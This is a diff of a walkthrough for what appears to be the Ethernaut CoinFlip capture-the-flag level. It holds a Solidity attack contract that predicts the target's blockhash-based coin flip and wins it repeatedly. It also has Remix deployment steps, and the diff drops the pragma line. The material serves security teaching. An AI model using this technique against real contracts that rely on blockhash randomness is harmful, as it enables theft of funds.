@@ -100,35 +100,32 @@ Now if you realize that the "randomness" created in this block is not truly rand
     
 6. Copy the following code in `attack.sol`
     
-7. ```solidity
-    pragma solidity ^0.8.0;
-      
-      import './CoinFlip.sol';
-      
-      contract CoinFlipAttack{
-        
-        
-        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        address instanceAddress = "Your Instance Address, without the Quotes" ;
-      //creates a variable of type CoinFlip pointing to our instanceAddress
-        CoinFlip public originalContract = CoinFlip(instanceAddress);
-      //same code to generate same result. 
-        function coinAttack() public {
-          uint256 blockValue = uint256(blockhash(block.number - 1));
-          uint256 coinFlip = blockValue/FACTOR;
-          bool side = coinFlip == 1 ? true : false;
-      //calling the flip function in the contract and feeding it our solution.    
-          originalContract.flip(side);
-        }
-      
-      }
-    ```
+
+```solidity
+import './CoinFlip.sol';
+
+contract CoinFlipAttack{
+     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+     address instanceAddress = "Your Instance Address, without the Quotes" ;
+   //creates a variable of type CoinFlip pointing to our instanceAddress
+     CoinFlip public originalContract = CoinFlip(instanceAddress);
+   //same code to generate same result. 
+     function coinAttack() public {
+       uint256 blockValue = uint256(blockhash(block.number - 1));
+       uint256 coinFlip = blockValue/FACTOR;
+       bool side = coinFlip == 1 ? true : false;
+   //calling the flip function in the contract and feeding it our solution.    
+       originalContract.flip(side);
+     }
+   
+ }
+```
+
+1. Make sure to deploy both `attack.sol` and `coinflip.sol` in Remix.
     
-8. Make sure to deploy both `attack.sol` and `coinflip.sol` in Remix.
+2. Now call the `coinAttack()` function 10 times, to pass the stage.
     
-9. Now call the `coinAttack()` function 10 times, to pass the stage.
-    
-10. Make sure that `consecutiveWins()` is increasing by putting this in your console.
+3. Make sure that `consecutiveWins()` is increasing by putting this in your console.
     
     ```javascript
     await contract.consecutiveWins()
